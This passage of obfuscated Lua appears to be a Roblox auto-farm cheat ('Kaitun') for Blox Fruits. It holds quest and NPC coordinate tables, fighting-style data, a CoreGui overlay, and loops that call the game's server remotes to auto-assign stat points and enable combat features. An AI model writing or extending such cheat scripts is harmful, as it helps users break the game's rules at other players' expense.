                          continue
                        end

                        break
                      end

                      return findFirstChild3
                    end

                    helper3 = nil

                    function helper3(val146)
                      local val147 = 8
                      local level3 = nil
                      local val148 = nil
                      local val149, max3, val150

                      while true do
                        if val147 <= 4 then
                          if val147 <= 1 then
                            if val147 <= 0 then
                              return nil
                            end

                            val147 = 3
                            level3 = 0
                            continue
                          end

                          if val147 <= 2 then
                            val148[val146] = max3(val149, level3)
                            val147 = 6
                          elseif val147 <= 3 then
                            val148 = val39
                            max3 = math.max
                            local val151 = val39[val146]

                            if val151 then
                              val147 = 2
                              val149 = val151
                            else
                              val147 = 4
                            end
                          else
                            val147 = 2
                            val149 = 0
                          end
                        else
                          if val147 <= 6 then
                            if val147 <= 5 then
                              val147 = level3 and 3 or 1
                              continue
                            end

                            break
                          end

                          if val147 <= 7 then
                            level3 = val150:FindFirstChild("Level")
                            val147 = level3 and 9 or 5
                          elseif val147 <= 8 then
                            local val152 = helper2(val146)

                            if not val152 then
                              val147 = 0
                            else
                              val147 = 7
                              val150 = val152
                            end
                          else
                            level3 = tonumber(level3.Value)
                            val147 = 5
                          end
                        end
                      end

                      return val150
                    end

                    function x(val153)
                      local val154 = 1

                      while true do
                        if val154 <= 0 then
                          val153 = val39[val153] ~= nil
                          val154 = 2
                          continue
                        end

                        if val154 <= 1 then
                          helper4(false)
                          local val155 = helper3(val153) ~= nil

                          if val155 then
                            val154 = 2
                            val153 = val155
                          else
                            val154 = 0
                          end

                          continue
                        end

                        break
                      end

                      return val153
                    end

                    function G()
                      local val156 = 1
                      local val157

                      while not (val156 <= 0) do
                        helper4(false)

                        for key8 in pairs(val33) do
                          helper3(key8)
                        end

                        val157 = {}

                        for key9, value5 in pairs(val39) do
                          val157[key9] = value5
                        end

                        val156 = 0
                      end

                      return val157
                    end

                    function m(val158)
                      local val159 = 21
                      local val160 = nil

                      while true do
                        if val159 <= 10 then
                          if val159 <= 4 then
                            if val159 <= 1 then
                              if val159 <= 0 then
                                val159 = 17
                                val160 = 0
                              else
                                val159 = 14
                                val160 = 0
                              end
                            elseif val159 <= 2 then
                              Death_Step = val158[val160] ~= nil
                              Sharkman_Karate_C = val158["Sharkman Karate"] ~= nil
                              Electric_Claw_C = val158["Electric Claw"] ~= nil
                              Dragon_Talon_C = val158["Dragon Talon"] ~= nil
                              God_Human_C = val158.Godhuman ~= nil
                              local blackLeg3 = val158["Black Leg"]

                              if blackLeg3 then
                                val159 = 11
                                val160 = blackLeg3
                              else
                                val159 = 15
                              end
                            elseif val159 <= 3 then
                              Dragon_Talon_C_M = val160 >= 400
                              local godhuman3 = val158.Godhuman

                              if godhuman3 then
                                val159 = 19
                                val158 = godhuman3
                              else
                                val159 = 9
                              end
                            else
                              val159 = 8
                              val160 = 0
                            end
                          elseif val159 <= 7 then
                            if val159 <= 5 then
                              val159 = 22
                              val160 = 0
                            elseif val159 <= 6 then
                              val159 = 3
                              val160 = 0
                            else
                              Super_humanw_C_M = val160 >= 400
                              local deathStep3 = val158["Death Step"]

                              if deathStep3 then
                                val159 = 22
                                val160 = deathStep3
                              else
                                val159 = 5
                              end
                            end
                          elseif val159 <= 8 then
                            Electro_C_M = val160 >= 400
                            local fishmanKarate3 = val158["Fishman Karate"]

                            if fishmanKarate3 then
                              val159 = 14
                              val160 = fishmanKarate3
                            else
                              val159 = 1
                            end
                          elseif val159 <= 9 then
                            val159 = 19
                            val158 = 0
                          else
                            val159 = 20
                            val160 = 0
                          end

                          continue
                        end

                        if not (val159 <= 16) then
                          if val159 <= 19 then
                            if val159 <= 17 then
                              Electric_Claw_C_M = val160 >= 400
                              local dragonTalon3 = val158["Dragon Talon"]

                              if dragonTalon3 then
                                val159 = 3
                                val160 = dragonTalon3
                              else
                                val159 = 6
                              end
                            elseif val159 <= 18 then
                              val159 = 7
                              val160 = 0
                            else
                              God_Human_C_M = val158 >= 400
                              val159 = 12
                            end
                          elseif val159 <= 20 then
                            Sharkman_Karate_C_M = val160 >= 400
                            local electricClaw3 = val158["Electric Claw"]

                            if electricClaw3 then
                              val159 = 17
                              val160 = electricClaw3
                            else
                              val159 = 0
                            end
                          elseif val159 <= 21 then
                            Black_Leg_C = val158["Black Leg"] ~= nil
                            Electro_C = val158.Electro ~= nil
                            Fishman_Karate_C = val158["Fishman Karate"] ~= nil
                            Dragon_Claw_C = val158["Dragon Claw"] ~= nil
                            Super_human = val158.Superhuman ~= nil
                            val159 = 2
                            val160 = "Death Step"
                          else
                            Death_Step_C_M = val160 >= 400
                            local sharkmanKarate3 = val158["Sharkman Karate"]

                            if sharkmanKarate3 then
                              val159 = 20
                              val160 = sharkmanKarate3
                            else
                              val159 = 10
                            end
                          end

                          continue
                        end

                        if not (val159 <= 13) then
                          if val159 <= 14 then
                            Fishman_Karate_C_M = val160 >= 400
                            local dragonClaw3 = val158["Dragon Claw"]

                            if dragonClaw3 then
                              val159 = 16
                              val160 = dragonClaw3
                            else
                              val159 = 13
                            end
                          elseif val159 <= 15 then
                            val159 = 11
                            val160 = 0
                          else
                            Dragon_Claw_C_M = val160 >= 400
                            local superhuman3 = val158.Superhuman

                            if superhuman3 then
                              val159 = 7
                              val160 = superhuman3
                            else
                              val159 = 18
                            end
                          end

                          continue
                        end

                        if val159 <= 11 then
                          Black_Leg_C_M = val160 >= 400
                          local electro3 = val158.Electro

                          if electro3 then
                            val159 = 8
                            val160 = electro3
                          else
                            val159 = 4
                          end

                          continue
                        end

                        if not (val159 <= 12) then
                          val159 = 16
                          val160 = 0
                          continue
                        end

                        break
                      end
                    end

                    cframe = {}
                    dutDit = { Name = "Black Leg", Target = 300 }
                    new = { Name = "Electro", Target = 300 }
                    divider = { Name = "Fishman Karate" }
                    bomayyeuvietnamKaitunRunning3 = 15
                    frame = "Order"
                    divider2 = "Target"
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 43 then
                  if bomayyeuvietnamKaitunRunning3 <= 41 then
                    cframe[dutDit] = new

                    cframe.PositionsBySea = {
                      [2] = CFrame.new(
                        -2599.621826, 238.198334, -10315.998047, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106
                      ), [3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469), }

                    bomayyeuvietnamKaitunRunning3 = 240
                  elseif bomayyeuvietnamKaitunRunning3 <= 42 then
                    val23[frame] = cframe[dutDit](77.92, 24.8, -12247.26)
                    val23["Chocolate Bar Battler"] = CFrame.new(717.46, 24.8, -12637.87)
                    val23["Sweet Thief"] = CFrame.new(-140.26, 24.71, -12652.31)

                    cframe = CFrame.new(56.08, 24.86, -12953)
                    bomayyeuvietnamKaitunRunning3 = 73
                    frame = "Candy Rebel"
                  else
                    cframe[fromRGB2] = fontWeight(cframe3, val42, val43, val44)
                    cframe.Size = UDim2.new(1, -47, 1, -47)
                    cframe.Selectable = false

                    dutDit.CornerRadius = UDim.new(0, 5)
                    dutDit.Parent = cframe

                    fromRGB2 = Color3.fromRGB
                    bomayyeuvietnamKaitunRunning3 = 94
                    dutDit = "Color"
                    fontWeight = 135
                    cframe3 = 206
                    val42 = 250
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 44 then
                  cframe = {}

                  dutDit = {
                    Min = 1500, Max = 1524, Ms = "Pirate Millionaire", Mon = "Pirate Millionaire", Quest = "PiratePortQuest", QLv = 1, Next = 1525, }

                  divider = CFrame.new
                  bomayyeuvietnamKaitunRunning3 = 62
                  new = "CQ"
                  divider2 = -290.074677
                  typeAccountScroll = 42.9034653
                  itemLabel1 = 5581.58984
                  new2 = 0.965929627
                  itemLabel12 = 0
                elseif bomayyeuvietnamKaitunRunning3 <= 45 then
                  cframe[dutDit] = 3

                  val33[frame] = cframe

                  val33["Dragon Talon"] = {
                    Names = { "Uzoth" }, Position = CFrame.new(5662.28857, 1206.85913, 870.284912), Command = { "BuyDragonTalon" }, MinSea = 3, }

                  cframe = {}
                  bomayyeuvietnamKaitunRunning3 = 155
                  frame = "Godhuman"
                  dutDit = "Names"
                else
                  new5[fromRGB] = "Living Zombie"
                  new5.Mon = "Living Zombie"
                  new5.Quest = "HauntedQuest1"
                  new5.QLv = 2
                  new5.Next = 2025
                  new5.Fallback = "Reborn Skeleton"
                  new5.CQ = CFrame.new(-9480.827148, 142.130661, 5566.071289)

                  new6 = CFrame.new
                  bomayyeuvietnamKaitunRunning3 = 47
                  fromRGB = "CMon"
                  cframe2 = -10125.234375
                  top = 183.947052
                end
              elseif bomayyeuvietnamKaitunRunning3 <= 69 then
                if bomayyeuvietnamKaitunRunning3 <= 57 then
                  if bomayyeuvietnamKaitunRunning3 <= 51 then
                    if bomayyeuvietnamKaitunRunning3 <= 48 then
                      if bomayyeuvietnamKaitunRunning3 <= 47 then
                        new5[fromRGB] = new6(cframe2, top, 6242.013671)

                        fromRGB = {
                          Min = 2025, Max = 2049, Ms = "Demonic Soul", Mon = "Demonic", Quest = "HauntedQuest2", QLv = 1, Next = 2050, Fallback = "Living Zombie", }

                        cframe2 = CFrame.new
                        bomayyeuvietnamKaitunRunning3 = 10
                        new6 = "CQ"
                      else
                        divider2[typeAccountScroll] = itemLabel1(
                          new2, itemLabel12, textLabel, levelLabel, new3, dropShadow2, main, new4, new5, fromRGB, new6, cframe2
                        )

                        divider2.CMon = CFrame.new(6488.915527, 383.383758, -110.66246)

                        typeAccountScroll = {
                          Min = 1625, Max = 1649, Ms = "Female Islander", Mon = "Female Islander", Quest = "AmazonQuest2", QLv = 1, }

                        bomayyeuvietnamKaitunRunning3 = 90
                        itemLabel1 = "Next"
                        new2 = 1650
                      end
                    elseif bomayyeuvietnamKaitunRunning3 <= 49 then
                      itemLabel12[textLabel] = levelLabel
                      itemLabel12.Mon = "Vampire"
                      itemLabel12.Quest = "ZombieQuest"
                      itemLabel12.QLv = 2
                      itemLabel12.Next = 1000
                      itemLabel12.Fallback = "Zombie"

                      levelLabel = CFrame.new
                      bomayyeuvietnamKaitunRunning3 = 325
                      textLabel = "CQ"
                      new3 = -5497.06152
                      dropShadow2 = 47.5923004
                      main = -795.237061
                      new4 = -0.29242146
                      new5 = 0
                      fromRGB = -0.95628953
                      new6 = 0
                      cframe2 = 1
                      top = 0
                      udim2 = 0.95628953
                      textLabel2 = 0
                      udim22 = -0.29242146
                    elseif bomayyeuvietnamKaitunRunning3 <= 50 then
                      itemLabel1[new2] = itemLabel12(
                        textLabel, levelLabel, new3, dropShadow2, main, new4, new5, fromRGB, new6, cframe2, top, -0.342042685
                      )

                      itemLabel1.CMon = CFrame.new(
                        1376.86401, 97.2779999, -1396.93115, -0.986755967, 7.71178321e-8, -0.162211925, 7.71531674e-8, 1, 6.08143536e-9, 0.162211925, -6.51427134e-9, -0.986755967
                      )

                      new2 = { Min = 120, Max = 174, Ms = "Chief Petty Officer" }
                      bomayyeuvietnamKaitunRunning3 = 219
                      itemLabel12 = "Mon"
                    else
                      textLabel2 = textLabel2[udim22]("TextLabel")
                      udim22 = Instance.new("UIGradient")
                      under = Instance.new("TextLabel")
                      uiGradient = Instance.new("UIGradient")
                      new7 = Instance.new("ImageLabel")
                      coinCard.Name = "CoinCard"
                      fontWeight = coreGui
                      bomayyeuvietnamKaitunRunning3 = 86
                      fromRGB2 = "Parent"
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 54 then
                    if bomayyeuvietnamKaitunRunning3 <= 52 then
                      dropShadow2[main] = new4.new(
                        -6064.06885, 15.2422857, -4902.97852, 0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, 0.453972578
                      )

                      new4 = CFrame.new
                      bomayyeuvietnamKaitunRunning3 = 21
                      main = "CMon"
                      new5 = -6401.27979
                      fromRGB = 15.9775667
                      new6 = -5948.24316
                      cframe2 = 0.388303697
                      top = 0
                      udim2 = -0.921531856
                      textLabel2 = 0
                      udim22 = 1
                      under = 0
                      uiGradient = 0.921531856
                      new7 = 0
                      fromRGB2 = 0.388303697
                    elseif bomayyeuvietnamKaitunRunning3 <= 53 then
                      itemLabel12.Name = "Fishman Karate"
                      itemLabel12.Target = 400
                      itemLabel12.MinSea = 3

                      textLabel = { Name = "Sharkman Karate", BuyOnly = true }
                      levelLabel = { Name = "Electro", Target = 400, MinSea = 3 }
                      new3 = { Name = "Electric Claw" }
                      bomayyeuvietnamKaitunRunning3 = 368
                      dropShadow2 = "BuyOnly"
                    else
                      local create4 = val28:Create(dutDit, tweenInfo, {
                        BackgroundTransparency = 0, })

                      divider.MouseButton1Down:Connect(function()
                        local val161 = 1

                        while true do
                          if val161 <= 3 then
                            if val161 <= 1 then
                              if val161 <= 0 then
                                create4:Play()
                                val161 = 5
                              else
                                val161 = val29 and 4 or 2
                              end
                            elseif val161 <= 2 then
                              val28:Create(nil, tweenInfo, { Size = size }):Play()
                              val161 = 3
                            else
                              val29 = not val29
                              val161 = val30 and 0 or 6
                            end

                            continue
                          end

                          if val161 <= 5 then
                            if val161 <= 4 then
                              val28:Create(nil, tweenInfo, { Size = udim }):Play()
                              val161 = 3
                            else
                              val30 = not val30
                              coinCard.Enabled = not coinCard.Enabled

                              val28:Create(cameraBlur, tweenInfo, {
                                Size = coinCard.Enabled and 8 or 0, }):Play()

                              val161 = 7
                            end

                            continue
                          end

                          if val161 <= 6 then
                            create:Play()
                            val161 = 5
                            continue
                          end

                          break
                        end
                      end)

                      local val162 = placeId == 2753915549

                      if val162 then
                        bomayyeuvietnamKaitunRunning3 = 110
                        frame = val162
                      else
                        bomayyeuvietnamKaitunRunning3 = 172
                      end
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 55 then
                    cframe.MinSea = 1
                    cframe.BeliCost = 750000

                    val33[frame] = cframe
                    cframe = { Names = { "Sabi" } }
                    new = {}
                    divider2 = CFrame.new
                    bomayyeuvietnamKaitunRunning3 = 242
                    frame = "Dragon Claw"
                    dutDit = "PositionsBySea"
                    divider = 2
                    typeAccountScroll = 699.028992
                    itemLabel1 = 185.660995
                    new2 = 654.89502
                    itemLabel12 = -0.971684337
                    textLabel = 0
                    levelLabel = -0.236283794
                    new3 = 0
                    dropShadow2 = 1
                    main = 0
                    new4 = 0.236283794
                    new5 = 0
                    fromRGB = -0.971684337
                  elseif bomayyeuvietnamKaitunRunning3 <= 56 then
                    new[divider] = divider2(
                      typeAccountScroll, 33.929848, -4767.102539, -0.453972578, 0, -0.891015649, 0, 1, 0, 0.891015649, 0, -0.453972578
                    )

                    new[3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469)

                    cframe[dutDit] = new
                    cframe.Command = { "BuyElectro" }
                    cframe.MinSea = 1

                    bomayyeuvietnamKaitunRunning3 = 259
                    dutDit = "BeliCost"
                  else
                    bomayyeuvietnamKaitunRunning3 = getgenv().BOMAYYEUVIETNAMKaitunRunning
                        and 136
                      or 157
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 63 then
                  if bomayyeuvietnamKaitunRunning3 <= 60 then
                    if bomayyeuvietnamKaitunRunning3 <= 58 then
                      new6[dutDit] = new.fromRGB(255, 255, 255)
                      new6.TextSize = 16
                      new6.TextXAlignment = Enum.TextXAlignment.Left
                      new6.TextYAlignment = Enum.TextYAlignment.Bottom

                      cframe2.BackgroundTransparency = 1
                      cframe2.Parent = cframe

                      new = UDim2
                      bomayyeuvietnamKaitunRunning3 = 207
                      dutDit = "Position"
                      fromRGB2 = "new"
                    elseif bomayyeuvietnamKaitunRunning3 <= 59 then
                      new2[itemLabel12] = textLabel(
                        levelLabel, new3, dropShadow2, main, new4, new5, fromRGB, new6, cframe2, 0.95628953, 0, -0.29242146
                      )

                      new2.CMon = CFrame.new(
                        -5649.23438, 126.0578, -737.773743, 0.355238914, -8.10359282e-8, 0.934775114, 1.65461245e-8, 1, 8.04023372e-8, -0.934775114, -1.3095117e-8, 0.355238914
                      )

                      itemLabel12 = { Min = 975, Max = 999 }
                      bomayyeuvietnamKaitunRunning3 = 49
                      textLabel = "Ms"
                      levelLabel = "Vampire"
                    else
                      typeAccountScroll[divider] = divider2
                      typeAccountScroll.BackgroundTransparency = 1

                      local uiListLayout3 = Instance.new("UIListLayout")
                      uiListLayout3.Parent = typeAccountScroll
                      uiListLayout3.Padding = UDim.new(0, 5)
                      uiListLayout3.SortOrder = Enum.SortOrder.LayoutOrder

                      for index3, value6 in ipairs({ itemLabel1, new2, itemLabel12 }) do
                        value6.LayoutOrder = index3
                        value6.Text = string.format("Item slot %02d", index3)
                        value6.TextColor3 = val25.Muted

                        cframe2(value6)
                      end

                      bomayyeuvietnamKaitunRunning3 = 105
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 61 then
                    new5[dutDit] = new[fromRGB2].Bottom

                    fromRGB.BackgroundTransparency = 1
                    fromRGB.Parent = cframe
                    fromRGB.Position = UDim2.new(0.070000000298023, 0, 0.89999997615814, 0)
                    fromRGB.Size = UDim2.new(0, 0, 0, 18)
                    fromRGB.Selectable = false

                    bomayyeuvietnamKaitunRunning3 = 89
                  elseif bomayyeuvietnamKaitunRunning3 <= 62 then
                    dutDit[new] = divider(
                      divider2, typeAccountScroll, itemLabel1, new2, itemLabel12, -0.258804798, 0, 1, 0, 0.258804798, 0, 0.965929627
                    )

                    dutDit.CMon = CFrame.new(81.164993, 43.755737, 5724.702148)

                    new = {
                      Min = 1525, Max = 1574, Ms = "Pistol Billionaire", Mon = "Pistol Billionaire", }

                    bomayyeuvietnamKaitunRunning3 = 25
                    divider = "Quest"
                  else
                    textLabel[levelLabel] = new3(
                      dropShadow2, main, new4, new5, fromRGB, new6, cframe2, top, udim2, textLabel2, udim22, 0.465965867
                    )

                    levelLabel = {
                      Min = 190, Max = 209, Ms = "Prisoner", Mon = "Prisoner", Quest = "PrisonerQuest", QLv = 1, Next = 210, }

                    dropShadow2 = CFrame.new
                    bomayyeuvietnamKaitunRunning3 = 321
                    new3 = "CQ"
                    main = 5308.93115
                    new4 = 1.65517521
                    new5 = 475.120514
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 66 then
                  if bomayyeuvietnamKaitunRunning3 <= 64 then
                    if New_World then
                      bomayyeuvietnamKaitunRunning3 = 156
                    else
                      bomayyeuvietnamKaitunRunning3 = 338
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 65 then
                    frame = frame.PlayerAdded:Wait()
                    bomayyeuvietnamKaitunRunning3 = 269
                  else
                    divider[frame] = new.fromRGB(27, 42, 53)
                    val28 = tweenService
                    val29 = false
                    udim = UDim2.new(0, 40, 0, 40)
                    frame = UDim2.new
                    bomayyeuvietnamKaitunRunning3 = 72
                    new = 0
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 67 then
                  dropShadow2[dutDit] = Enum.TextYAlignment.Bottom

                  main.BackgroundTransparency = 1
                  main.Parent = cframe
                  main.Position = UDim2.new(0.75, 0, 0.89999997615814, 0)
                  main.Size = UDim2.new(0, 0, 0, 18)

                  bomayyeuvietnamKaitunRunning3 = 342
                  dutDit = "Selectable"
                elseif bomayyeuvietnamKaitunRunning3 <= 68 then
                  new[1] = divider

                  cframe[dutDit] = new
                  cframe.MinSea = 1
                  cframe.BeliCost = 150000

                  val33[frame] = cframe
                  cframe = { Names = { "Mad Scientist" } }
                  new = { CFrame.new(-4631.24, 13.46, -355.36) }
                  divider2 = CFrame.new
                  bomayyeuvietnamKaitunRunning3 = 56
                  frame = "Electro"
                  dutDit = "PositionsBySea"
                  divider = 2
                  typeAccountScroll = -4866.150391
                else
                  uiGradient[new7] = fromRGB2
                  uiGradient.CQ = CFrame.new(-1928.31763, 37.7296638, -12840.626)
                  uiGradient.CMon = CFrame.new(-1818.3479, 93.412757, -12887.66015)

                  new7 = {
                    Min = 2300, Max = 2324, Ms = "Cocoa Warrior", Mon = "Cocoa Warrior", }

                  bomayyeuvietnamKaitunRunning3 = 292
                end
              elseif bomayyeuvietnamKaitunRunning3 <= 81 then
                if bomayyeuvietnamKaitunRunning3 <= 75 then
                  if bomayyeuvietnamKaitunRunning3 <= 72 then
                    if bomayyeuvietnamKaitunRunning3 <= 70 then
                      levelLabel[dutDit] = new

                      levelLabel.FontFace = Font.new(
                        "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                      )

                      levelLabel.Text = "Level: N/A    Third Sea : Ã¢ÂÂŒ"
                      levelLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

                      bomayyeuvietnamKaitunRunning3 = 266
                      dutDit = "TextSize"
                      new = 16
                    elseif bomayyeuvietnamKaitunRunning3 <= 71 then
                      new2[dutDit] = UDim2.new(0, 0, 0, 20)
                      new2.Size = UDim2.new(1, 0, 0, 18)
                      new2.Selectable = false

                      new = Font.new
                      fontWeight = Enum.FontWeight.Bold
                      bomayyeuvietnamKaitunRunning3 = 8
                      dutDit = "FontFace"
                      fromRGB2 = "rbxasset://fonts/families/GothamSSm.json"
                    else
                      size = frame(new, 30, 0, 30)

                      tweenInfo = TweenInfo.new(
                        0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out
                      )

                      val30 = false
                      create = val28:Create(dutDit, tweenInfo, { BackgroundTransparency = 0.18 })
                      bomayyeuvietnamKaitunRunning3 = 54
                    end
                  elseif bomayyeuvietnamKaitunRunning3 <= 73 then
                    val23[frame] = cframe
                    val23["Candy Pirate"] = CFrame.new(-1372.53, 32.11, -14506.54)
                    val23["Snow Demon"] = CFrame.new(-865.98, 13.21, -14589.03)
                    val23["Island Boy"] = CFrame.new(-16736.23, 20.54, -131.72)

                    cframe = CFrame.new
                    bomayyeuvietnamKaitunRunning3 = 127
                    frame = "Isle Outlaw"
                  elseif bomayyeuvietnamKaitunRunning3 <= 74 then
                    divider2[typeAccountScroll] = itemLabel1(
                      new2, itemLabel12, 4392.43359, 0.819155693, 0, -0.573571265, 0, 1, 0, 0.573571265, 0, 0.819155693
                    )

                    divider2.CMon = CFrame.new(
                      1617.07886, 1.5542295, 4295.54932, -0.997540116, -2.26287735e-8, -0.070099175, -1.69377223e-8, 1, -8.17798806e-8, 0.070099175, -8.03913949e-8, -0.997540116
                    )

                    typeAccountScroll = {}
                    bomayyeuvietnamKaitunRunning3 = 85
                    itemLabel1 = "Min"
                  else
                    top[udim2] = textLabel2(
                      udim22, under, uiGradient, new7, fromRGB2, 0.892505825, -1.08168464e-7, 1, -3.22542007e-7, -0.892505825, -2.4201924e-7, -0.451037169
                    )

                    udim2 = {
                      Min = 1375, Max = 1424, Ms = "Snow Lurker", Mon = "Snow Lurker", Quest = "FrostQuest", QLv = 2, Next = 1450, }

                    bomayyeuvietnamKaitunRunning3 = 87
                    textLabel2 = "Fallback"
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 78 then
                  if bomayyeuvietnamKaitunRunning3 <= 76 then
                    fromRGB.Quest = "ShipQuest1"
                    fromRGB.QLv = 2
                    fromRGB.Next = 1300
                    fromRGB.Fallback = "Ship Deckhand"

                    fromRGB.CQ = CFrame.new(
                      1037.80127, 125.092171, 32911.6016, -0.244533166, 0, -0.969640911, 0, 1.00000012, 0, 0.96964103, 0, -0.244533136
                    )

                    cframe2 = CFrame
                    bomayyeuvietnamKaitunRunning3 = 199
                    new6 = "CMon"
                  elseif bomayyeuvietnamKaitunRunning3 <= 77 then
                    fromRGB.Parent = dutDit
                    fromRGB.Thickness = 1

                    dutDit = Instance.new("UIGradient")
                    dutDit.Parent = fromRGB

                    cframe2 = NumberSequence.new
                    udim2 = {}
                    udim22 = NumberSequenceKeypoint.new(0, 0)
                    uiGradient = NumberSequenceKeypoint.new(0, 0)
                    fromRGB2 = NumberSequenceKeypoint
                    bomayyeuvietnamKaitunRunning3 = 16
                    fromRGB = "Transparency"
                    fontWeight = "new"
                  else
                    udim2.QLv = 1
                    udim2.Next = 2150

                    udim2.CQ = CFrame.new(
                      -820.404358, 65.8453293, -10965.5654, 0.822534859, 5.24448502e-8, -0.568714678, -2.08336317e-8, 1, 6.20846663e-8, 0.568714678, -3.92184099e-8, 0.822534859
                    )

                    udim22 = CFrame.new
                    bomayyeuvietnamKaitunRunning3 = 236
                    textLabel2 = "CMon"
                    under = -821.614075
                    uiGradient = 208.39537
                    new7 = -10990.7617
                    fromRGB2 = -0.870096624
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 79 then
                  task.spawn(function()
                    local val163 = 0

                    while true do
                      if val163 <= 0 then
                        val163 = task.wait(0.5) and 1

                        if val163 then
                          continue
                        end

                        val163 = 2
                        continue
                      end

                      if val163 <= 1 then
                        val21.p(function()
                          local val164 = 18
                          local val165 = nil

                          while true do
                            if not (val164 <= 9) then
                              if val164 <= 14 then
                                if val164 <= 11 then
                                  if val164 <= 10 then
                                    val164 = val165 and 12 or 13
                                  else
                                    val164 = val165 and 16 or 3
                                  end
                                elseif val164 <= 12 then
                                  val165 = localPlayer.Data.Stats.Defense.Level.Value < val20
                                  val164 = 13
                                elseif val164 <= 13 then
                                  val164 = val165 and 1 or 8
                                else
                                  val165 = localPlayer.Data.Stats.Sword.Level.Value < val20
                                  val164 = 17
                                end
                              elseif val164 <= 17 then
                                if val164 <= 15 then
                                  val37.Remotes.CommF_:InvokeServer(
                                    "AddPoint", "Sword", localPlayer.Data.Points.Value
                                  )

                                  val164 = 20
                                elseif val164 <= 16 then
                                  val165 = localPlayer.Data.Points.Value > 0
                                  val164 = 3
                                else
                                  val164 = val165 and 15 or 20
                                end
                              elseif val164 <= 18 then
                                local val166 = localPlayer.Data.Points.Value > 0

                                if val166 then
                                  val164 = 19
                                else
                                  val164 = 5
                                  val165 = val166
                                end
                              elseif val164 <= 19 then
                                val165 = localPlayer.Data.Stats.Melee.Level.Value < val20
                                val164 = 5
                              else
                                val164 = not val21.ffc(localPlayer.Character, "HasBuso") and 0 or 6
                              end

                              continue
                            end

                            if val164 <= 4 then
                              if val164 <= 1 then
                                if val164 <= 0 then
                                  val37.Remotes.CommF_:InvokeServer("Buso")
                                  val164 = 6
                                else
                                  val37.Remotes.CommF_:InvokeServer(
                                    "AddPoint", "Defense", localPlayer.Data.Points.Value
                                  )

                                  val164 = 8
                                end
                              elseif val164 <= 2 then
                                val37.Remotes.CommF_:InvokeServer(
                                  "AddPoint", "Melee", localPlayer.Data.Points.Value
                                )

                                val164 = 7
                              elseif val164 <= 3 then
                                val164 = val165 and 14 or 17
                              else
                                val165 = localPlayer.Data.Points.Value > 0
                                val164 = 10
                              end

                              continue
                            end

                            if not (val164 <= 6) then
                              if val164 <= 7 then
                                local val167 = localPlayer.Data.Stats.Melee.Level.Value >= val20

                                if val167 then
                                  val164 = 4
                                else
                                  val164 = 10
                                  val165 = val167
                                end
                              elseif val164 <= 8 then
                                local val168 = localPlayer.Data.Stats.Melee.Level.Value >= val20

                                if val168 then
                                  val164 = 9
                                else
                                  val164 = 11
                                  val165 = val168
                                end
                              else
                                val165 = localPlayer.Data.Stats.Defense.Level.Value >= val20
                                val164 = 11
                              end

                              continue
                            end

                            if val164 <= 5 then
                              val164 = val165 and 2 or 7
                              continue
                            end

                            break
                          end
                        end)

                        val163 = 0
                        continue
                      end

                      break
                    end
                  end)

                  getgenv()["Fast Attack"] = true
                  task.spawn(function(...) end)
                  frame = GetM("Mirror Fractal")
                  bomayyeuvietnamKaitunRunning3 = 245
                  cframe = 0
                elseif bomayyeuvietnamKaitunRunning3 <= 80 then
                  textLabel[dutDit] = new(fromRGB2, fontWeight, cframe3[val42].Normal)
                  textLabel.Text = "Beli: N/A"
                  textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                  textLabel.TextSize = 16
                  textLabel.TextXAlignment = Enum.TextXAlignment.Left

                  new = Enum.TextYAlignment
                  bomayyeuvietnamKaitunRunning3 = 5
                  dutDit = "TextYAlignment"
                  fromRGB2 = "Bottom"
                else
                  new4[new5] = fromRGB
                  new4.MinSea = 3

                  new5 = { Name = "Death Step", Target = 400, MinSea = 3 }
                  fromRGB = { Name = "Sharkman Karate", Target = 400, MinSea = 3 }
                  new6 = { Name = "Electric Claw", Target = 400 }
                  bomayyeuvietnamKaitunRunning3 = 190
                end
              elseif bomayyeuvietnamKaitunRunning3 <= 87 then
                if bomayyeuvietnamKaitunRunning3 <= 84 then
                  if bomayyeuvietnamKaitunRunning3 <= 82 then
                    val47[val48] = 2625
                    val47.Max = 2649
                    val47.Ms = "Coral Pirate"
                    val47.Mon = "Coral Pirates"
                    val47.Quest = "SubmergedQuest1"
                    val47.QLv = 2
                    val47.Next = 2650
                    val47.Fallback = "Reef Bandit"

                    new8 = CFrame.new
                    bomayyeuvietnamKaitunRunning3 = 3
                    val48 = "CQ"
                    val49 = 10778.875
                    new9 = -2087.72437
                    val50 = 9265.18359
                    val51 = 0.934615612
                  elseif bomayyeuvietnamKaitunRunning3 <= 83 then
                    new.Parent = dutDit
                    new.AnchorPoint = Vector2.new(0.5, 0.5)
                    new.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
                    new.BackgroundTransparency = 1
                    new.BorderSizePixel = 0

                    main = UDim2.new(0.5, 0, 0.0500000007, 0)
                    bomayyeuvietnamKaitunRunning3 = 117
                    dropShadow2 = "Position"
                  else
                    fromRGB2[fontWeight] = 2349
                    fromRGB2.Ms = "Chocolate Bar Battler"
                    fromRGB2.Mon = "Chocolate Bar Battler"
                    fromRGB2.Quest = "ChocQuest1"
                    fromRGB2.QLv = 2
                    fromRGB2.Next = 2350
                    fromRGB2.Fallback = "Cocoa Warrior"
                    fromRGB2.CQ = CFrame.new(230.191864, 24.734258, -12202.65722)

                    cframe3 = CFrame
                    bomayyeuvietnamKaitunRunning3 = 337
                    fontWeight = "CMon"
                    val42 = "new"
                  end
                elseif bomayyeuvietnamKaitunRunning3 <= 85 then
                  typeAccountScroll[itemLabel1] = 90
                  typeAccountScroll.Max = 99
                  typeAccountScroll.Ms = "Snow Bandit"
